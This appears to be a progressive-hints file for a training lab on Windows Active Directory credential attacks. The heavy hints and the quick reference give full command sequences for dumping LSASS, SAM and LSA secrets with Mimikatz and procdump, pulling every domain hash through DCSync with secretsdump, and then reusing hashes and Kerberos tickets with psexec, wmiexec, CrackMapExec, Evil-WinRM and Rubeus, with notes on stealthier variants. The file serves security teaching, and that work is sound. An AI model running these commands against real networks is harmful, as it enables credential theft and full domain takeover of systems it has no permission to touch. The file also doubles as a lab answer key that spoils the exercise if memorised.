# Credential Attacks Hints

Progressive hints for each credential attack task.

---

## Task 1: Credential Extraction with Mimikatz

### Hint 1 (Light)
Mimikatz requires local administrator privileges and debug privileges enabled. Run as Administrator and use `privilege::debug` first.

### Hint 2 (Medium)
```powershell
# Basic Mimikatz workflow
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### Hint 3 (Heavy)
```powershell
# Complete credential extraction

# 1. Run Mimikatz as Administrator
mimikatz.exe

# 2. Enable debug privileges
mimikatz # privilege::debug
# Output: Privilege '20' OK

# 3. Dump all logon credentials
mimikatz # sekurlsa::logonpasswords
# Look for NTLM hashes and any plaintext passwords

# 4. Dump Kerberos tickets
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files

# 5. Dump SAM (local accounts)
mimikatz # lsadump::sam

# 6. Dump LSA secrets (service accounts, auto-logon)
mimikatz # lsadump::secrets

# If you can't run Mimikatz, use Procdump:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Then analyze offline:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Task 2: Remote Credential Dumping with secretsdump

### Hint 1 (Light)
Impacket's secretsdump.py can extract credentials remotely over SMB. You need local admin credentials on the target.

### Hint 2 (Medium)
```bash
# Basic secretsdump
secretsdump.py domain.local/admin:password@target_ip

# Or with hash
secretsdump.py domain.local/admin@target_ip -hashes :NTLM_HASH
```

### Hint 3 (Heavy)
```bash
# Complete remote credential dumping

# 1. Dump credentials from workstation
secretsdump.py domain.local/admin:password@192.168.1.100
# Extracts: SAM, LSA secrets, cached domain creds

# 2. DCSync - dump from Domain Controller
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc
# Gets all domain hashes from NTDS.dit

# 3. DCSync specific user (faster, less noisy)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user Administrator

# 4. Using hash instead of password
secretsdump.py domain.local/admin@dc01.domain.local -hashes :NTLM_HASH -just-dc

# 5. Save output to file
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc -outputfile domain_hashes
# Creates domain_hashes.ntds, domain_hashes.sam, etc.

# Alternative: DCSync with Mimikatz
mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.local
```

---

## Task 3: Pass-the-Hash (PtH)

### Hint 1 (Light)
Pass-the-Hash works because NTLM authentication uses the hash, not the password. You don't need to crack the hash.

### Hint 2 (Medium)
```bash
# Impacket tools accept -hashes parameter
psexec.py domain.local/user@target -hashes :NTLM_HASH
```

### Hint 3 (Heavy)
```bash
# Complete Pass-the-Hash workflow

# 1. With Impacket PsExec
psexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# 2. With Impacket WMIExec (stealthier)
wmiexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# 3. With CrackMapExec (great for multiple targets)
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d domain.local
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d domain.local -x "whoami"

# 4. With Evil-WinRM
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# 5. With Mimikatz (Windows)
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe
# New PowerShell has cached credentials - test with:
dir \\dc01.domain.local\c$

# Hash format notes:
# - Full format: LM:NTLM
# - NTLM only: :NTLM (colon prefix)
# - CrackMapExec: just NTLM (no colon)
```

---

## Task 4: Pass-the-Ticket (PtT)

### Hint 1 (Light)
Kerberos tickets are bearer tokens. Export tickets from one session and import them into another to gain that identity.

### Hint 2 (Medium)
```powershell
# Export tickets
mimikatz # sekurlsa::tickets /export

# Import tickets
mimikatz # kerberos::ptt ticket.kirbi
```

### Hint 3 (Heavy)
```powershell
# Complete Pass-the-Ticket workflow

# === On Windows ===

# 1. Export tickets with Mimikatz
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files for each ticket

# 2. Or export with Rubeus
.\Rubeus.exe dump /nowrap
# Gives base64 encoded tickets

# 3. Import ticket into current session
mimikatz # kerberos::ptt administrator@krbtgt-DOMAIN.LOCAL.kirbi

# 4. Or with Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:doIFvj...base64...

# 5. Verify ticket injection
klist

# 6. Access resources
dir \\dc01.domain.local\c$
```

```bash
# === On Linux ===

# 1. Convert .kirbi to .ccache
ticketConverter.py admin.kirbi admin.ccache

# 2. Set credential cache
export KRB5CCNAME=admin.ccache

# 3. Verify
klist

# 4. Use with Impacket (-k = Kerberos, -no-pass = no password prompt)
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
smbclient //dc01.domain.local/c$ -k -no-pass

# 5. CrackMapExec with Kerberos
crackmapexec smb dc01.domain.local --use-kcache
```

---

## Task 5: Overpass-the-Hash

### Hint 1 (Light)
Overpass-the-Hash converts an NTLM hash into a Kerberos TGT. This lets you use Kerberos authentication while only having the NTLM hash.

### Hint 2 (Medium)
```bash
# Request TGT with hash
getTGT.py domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP

# Export and use
export KRB5CCNAME=user.ccache
psexec.py domain.local/user@target -k -no-pass
```

### Hint 3 (Heavy)
```bash
# Complete Overpass-the-Hash workflow

# === Method 1: Impacket (Linux) ===

# 1. Request TGT using NTLM hash
getTGT.py domain.local/Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 192.168.1.10

# 2. Export ticket
export KRB5CCNAME=Administrator.ccache

# 3. Use Kerberos authentication
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass

# 4. More stealthy: use AES key instead of NTLM
getTGT.py domain.local/Administrator -aesKey AES256_KEY -dc-ip 192.168.1.10
export KRB5CCNAME=Administrator.ccache
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
```

```powershell
# === Method 2: Rubeus (Windows) ===

# 1. Request TGT and inject
.\Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt

# 2. More stealthy with AES256
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /ptt

# 3. Verify
klist

# 4. Access resources
dir \\dc01.domain.local\c$
```

```powershell
# === Method 3: Mimikatz (Windows) ===

# 1. Spawn process with new identity
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe

# 2. Or with AES key (stealthier)
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES256_KEY /run:powershell.exe

# 3. In new window, verify and use
klist
dir \\dc01.domain.local\c$
```

---

## Troubleshooting Hints

### Clock Skew Error
```bash
# Kerberos requires time within 5 minutes of DC
sudo ntpdate dc01.domain.local
# or
sudo rdate -n dc01.domain.local
```

### Access Denied with PtH
```bash
# User needs local admin on target for most tools
# Test with CrackMapExec first:
crackmapexec smb target -u user -H hash -d domain
# Look for "Pwn3d!" which indicates local admin
```

### Ticket Conversion
```bash
# Windows .kirbi to Linux .ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Linux .ccache to Windows .kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

### Hash Format Issues
```
# Impacket format (LM:NTLM):
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# NTLM only with Impacket:
:31d6cfe0d16ae931b73c59d7e0c089c0

# CrackMapExec format (just NTLM, no colon):
31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Common Mistakes

1. **Forgetting privilege::debug** - Mimikatz needs debug privileges for LSASS access
2. **Wrong hash format** - Check if tool expects LM:NTLM or just NTLM
3. **Time sync issues** - Kerberos attacks fail if clock is off by >5 minutes
4. **Using wrong domain** - NetBIOS name vs FQDN matter for some tools
5. **Missing local admin** - Most PtH tools require local admin on target
6. **Ticket expired** - TGTs default to 10 hours, check with klist
7. **DNS issues** - Kerberos uses hostnames, ensure proper resolution

---

## Quick Reference

### Credential Extraction
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /user:USER
secretsdump.py DOMAIN/USER:PASS@TARGET
```

### Pass-the-Hash
```
psexec.py DOMAIN/USER@TARGET -hashes :NTLM
crackmapexec smb TARGET -u USER -H NTLM -d DOMAIN
evil-winrm -i TARGET -u USER -H NTLM
```

### Pass-the-Ticket
```
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi
export KRB5CCNAME=ticket.ccache && psexec.py ... -k -no-pass
```

### Overpass-the-Hash
```
getTGT.py DOMAIN/USER -hashes :NTLM && export KRB5CCNAME=USER.ccache
Rubeus.exe asktgt /user:USER /rc4:NTLM /ptt
mimikatz # sekurlsa::pth /user:USER /ntlm:NTLM /run:cmd
```
